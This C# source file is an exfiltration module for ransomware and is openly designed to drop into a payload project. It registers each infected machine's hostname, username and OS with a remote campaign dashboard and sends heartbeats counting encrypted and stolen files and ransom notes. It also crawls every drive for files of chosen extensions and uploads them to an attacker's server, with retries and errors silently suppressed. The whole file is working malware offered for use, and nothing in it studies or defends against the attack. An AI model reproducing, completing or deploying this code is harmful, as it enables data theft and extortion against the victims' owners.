// =====================================================================
// EXFILTRATION MODULE - Full Dashboard Integration
// =====================================================================
// Drop-in replacement for Exfiltration class in PayloadSource_v2.cs
// Features:
// - System registration on first run
// - Heartbeat with stats updates
// - File exfiltration with metadata
// - Ransom note tracking
// - Encrypted payload support

internal static class Exfiltration
{
    private static string _systemId = null;
    private static bool _registered = false;
    private static DateTime _lastHeartbeat = DateTime.MinValue;
    private static readonly object _lock = new object();

    public static void Run()
    {
        if (!Config.ExfilEnabled) return;

        try
        {
            // Register system on first run
            if (!_registered)
            {
                RegisterSystem();
            }

            // Send periodic heartbeat
            SendHeartbeat();

            // Collect and exfiltrate files
            var files = CollectFiles();
            if (files.Count > 0)
            {
                foreach (var file in files)
                {
                    try { UploadFile(file); }
                    catch { /* Continue on upload failure */ }
                }
            }
        }
        catch { }
    }

    private static void RegisterSystem()
    {
        lock (_lock)
        {
            if (_registered) return;

            try
            {
                // Build system info
                var sysInfo = new System.Collections.Generic.Dictionary<string, string>
                {
                    ["hostname"] = Environment.MachineName,
                    ["username"] = Environment.UserName,
                    ["os"] = GetOSVersion(),
                    ["campaignId"] = ExtractCampaignId(Config.ExfilApiKey)
                };

                string json = SerializeSystemRegistration(Config.ExfilApiKey, sysInfo);
                
                using (var client = new System.Net.Http.HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(Config.ExfilTimeoutSeconds);
                    client.DefaultRequestHeaders.Add("Authorization", "Bearer " + Config.ExfilApiKey);

                    var content = new System.Net.Http.StringContent(json, Encoding.UTF8, "application/json");
                    var requestUri = Config.ExfilServerUrl.TrimEnd('/') + "/api/systems";

                    var response = client.PostAsync(requestUri, content).Result;
                    if (response.IsSuccessStatusCode)
                    {
                        string respJson = response.Content.ReadAsStringAsync().Result;
                        _systemId = ExtractSystemId(respJson);
                        _registered = true;
                    }
                }
            }
            catch { }
        }
    }

    private static void SendHeartbeat()
    {
        if (string.IsNullOrEmpty(_systemId)) return;
        
        // Throttle heartbeats to once per minute
        if ((DateTime.Now - _lastHeartbeat).TotalMinutes < 1) return;

        try
        {
            var stats = new System.Collections.Generic.Dictionary<string, object>
            {
                ["filesEncrypted"] = GetEncryptedCount(),
                ["filesExfiltrated"] = GetExfiltratedCount(),
                ["bytesExfiltrated"] = GetExfiltratedBytes(),
                ["ransomNoteDropped"] = RansomNoteDropped()
            };

            string json = SerializeHeartbeat(_systemId, stats);

            using (var client = new System.Net.Http.HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(10);
                client.DefaultRequestHeaders.Add("Authorization", "Bearer " + Config.ExfilApiKey);

                var content = new System.Net.Http.StringContent(json, Encoding.UTF8, "application/json");
                var requestUri = Config.ExfilServerUrl.TrimEnd('/') + "/api/systems";

                var response = client.PutAsync(requestUri, content).Result;
                if (response.IsSuccessStatusCode)
                {
                    _lastHeartbeat = DateTime.Now;
                }
            }
        }
        catch { }
    }

    private static List<string> CollectFiles()
    {
        var result = new List<string>();
        long maxSize = (long)Config.ExfilMaxFileSizeMB * 1024 * 1024;
        int count = 0;

        foreach (var drive in DriveInfo.GetDrives())
        {
            if (!drive.IsReady) continue;
            if (count >= Config.ExfilMaxFiles) break;

            try
            {
                CollectFromDirectory(drive.Name, result, maxSize, ref count);
            }
            catch { }
        }

        return result;
    }

    private static void CollectFromDirectory(string path, List<string> result, long maxSize, ref int count)
    {
        if (count >= Config.ExfilMaxFiles) return;

        try
        {
            foreach (string file in Directory.EnumerateFiles(path))
            {
                if (count >= Config.ExfilMaxFiles) break;

                try
                {
                    string ext = Path.GetExtension(file);
                    
                    // Check skip extensions first
                    bool shouldSkip = false;
                    foreach (string skipExt in Config.ExfilSkipExtensions)
                    {
                        if (string.Equals(ext, skipExt, StringComparison.OrdinalIgnoreCase))
                        {
                            shouldSkip = true;
                            break;
                        }
                    }
                    if (shouldSkip) continue;

                    // Check target extensions
                    bool match = false;
                    foreach (string targetExt in Config.ExfilTargetExtensions)
                    {
                        if (string.Equals(ext, targetExt, StringComparison.OrdinalIgnoreCase))
                        {
                            match = true;
                            break;
                        }
                    }
                    if (!match) continue;

                    // Check file size
                    var fi = new FileInfo(file);
                    if (fi.Length > maxSize) continue;
                    if (fi.Length == 0) continue;

                    // Skip system files
                    if (ShouldSkipFile(file)) continue;

                    result.Add(file);
                    count++;
                }
                catch { }
            }

            foreach (string subDir in Directory.EnumerateDirectories(path))
            {
                if (count >= Config.ExfilMaxFiles) break;
                try
                {
                    new DirectoryInfo(subDir).Attributes &= ~FileAttributes.ReadOnly;
                    CollectFromDirectory(subDir, result, maxSize, ref count);
                }
                catch { }
            }
        }
        catch { }
    }

    private static bool ShouldSkipFile(string path)
    {
        string lower = path.ToLowerInvariant();
        string[] skip = { 
            "appdata\\local", "appdata\\locallow", "users\\all users", "programdata",
            "windows", "recycle.bin", "system volume information",
            "boot.ini", "bootfont.bin", "iconcache.db", "ntuser.dat", 
            "ntuser.dat.log", "ntuser.ini", "thumbs.db", "autorun.inf", 
            "bootsect.bak", "bootmgfw.efi", "desktop.ini", "pagefile.sys",
            "hiberfil.sys", "swapfile.sys"
        };
        foreach (string s in skip)
            if (lower.Contains(s)) return true;
        return false;
    }

    private static void UploadFile(string filePath)
    {
        for (int attempt = 0; attempt <= Config.ExfilRetryCount; attempt++)
        {
            try
            {
                byte[] fileData = File.ReadAllBytes(filePath);
                
                // Compress if enabled
                if (Config.ExfilCompress)
                {
                    fileData = Compress(fileData);
                }
                
                // Encrypt if enabled (use same hybrid encryption)
                if (Config.ExfilEncrypt && Config.UseHybridEncryption)
                {
                    string tempEnc = Path.Combine(Path.GetTempPath(), SecureRandom.RandomName(12) + ".enc");
                    Crypto.EncryptFile(filePath, tempEnc);
                    fileData = File.ReadAllBytes(tempEnc);
                    try { File.Delete(tempEnc); } catch { }
                }

                using (var client = new System.Net.Http.HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(Config.ExfilTimeoutSeconds);
                    
                    if (!string.IsNullOrEmpty(Config.ExfilApiKey))
                    {
                        client.DefaultRequestHeaders.Add("Authorization", "Bearer " + Config.ExfilApiKey);
                    }

                    var content = new System.Net.Http.ByteArrayContent(fileData);
                    content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                    
                    // Add filename header for dashboard tracking
                    string fileName = Path.GetFileName(filePath);
                    content.Headers.Add("X-File-Name", fileName);
                    
                    // Add system ID if registered
                    if (!string.IsNullOrEmpty(_systemId))
                    {
                        content.Headers.Add("X-System-Id", _systemId);
                    }
                    
                    var requestUri = Config.ExfilServerUrl.TrimEnd('/') + "/api/exfil/upload";
                    
                    var response = client.PostAsync(requestUri, content).Result;
                    response.EnsureSuccessStatusCode();
                }
                
                // Update heartbeat stats after successful upload
                SendHeartbeat();
                
                break; // Success
            }
            catch
            {
                if (attempt < Config.ExfilRetryCount)
                {
                    Thread.Sleep(Config.ExfilRetryDelaySeconds * 1000);
                }
            }
        }
    }

    private static byte[] Compress(byte[] data)
    {
        using (var output = new MemoryStream())
        {
            using (var gzip = new System.IO.Compression.GZipStream(output, System.IO.Compression.CompressionLevel.Optimal))
            {
                gzip.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }
    }

    // ============ HELPER METHODS ============

    private static string GetOSVersion()
    {
        try
        {
            return Environment.OSVersion.VersionString;
        }
        catch { return "Windows"; }
    }

    private static string ExtractCampaignId(string apiKey)
    {
        // Campaign ID is embedded in API key or can be derived
        if (apiKey.StartsWith("ck_")) return apiKey.Substring(3, 12);
        return "unknown";
    }

    private static string SerializeSystemRegistration(string apiKey, System.Collections.Generic.Dictionary<string, string> sysInfo)
    {
        var sb = new StringBuilder();
        sb.Append("{");
        sb.AppendFormat("\"campaignId\":\"{0}\",", EscapeJson(apiKey.Length > 10 ? apiKey.Substring(0, 10) : "unknown"));
        sb.AppendFormat("\"victimId\":\"{0}\",", EscapeJson(Environment.MachineName + "_" + Environment.UserName));
        sb.Append("\"systemInfo\":{");
        bool first = true;
        foreach (var kvp in sysInfo)
        {
            if (!first) sb.Append(",");
            sb.AppendFormat("\"{0}\":\"{1}\"", EscapeJson(kvp.Key), EscapeJson(kvp.Value));
            first = false;
        }
        sb.Append("}}");
        return sb.ToString();
    }

    private static string SerializeHeartbeat(string systemId, System.Collections.Generic.Dictionary<string, object> stats)
    {
        var sb = new StringBuilder();
        sb.Append("{");
        sb.AppendFormat("\"id\":\"{0}\",", EscapeJson(systemId));
        sb.Append("\"stats\":{");
        bool first = true;
        foreach (var kvp in stats)
        {
            if (!first) sb.Append(",");
            if (kvp.Value is bool)
                sb.AppendFormat("\"{0}\":{1}", EscapeJson(kvp.Key), (bool)kvp.Value ? "true" : "false");
            else
                sb.AppendFormat("\"{0}\":{1}", EscapeJson(kvp.Key), kvp.Value);
            first = false;
        }
        sb.Append("}}");
        return sb.ToString();
    }

    private static string ExtractSystemId(string json)
    {
        try
        {
            int idx = json.IndexOf("\"systemId\":\"");
            if (idx >= 0)
            {
                idx += 12;
                int end = json.IndexOf("\"", idx);
                return json.Substring(idx, end - idx);
            }
        }
        catch { }
        return null;
    }

    private static string EscapeJson(string input)
    {
        if (string.IsNullOrEmpty(input)) return "";
        return input.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "\\n").Replace("\t", "\\t");
    }

    // Counters - would be tracked by encryption engine in real implementation
    private static int GetEncryptedCount() { return 0; } // TODO: Hook into EncryptionEngine
    private static int GetExfiltratedCount() { return 0; } // TODO: Track uploads
    private static long GetExfiltratedBytes() { return 0; } // TODO: Track bytes
    private static bool RansomNoteDropped() { return false; } // TODO: Track
}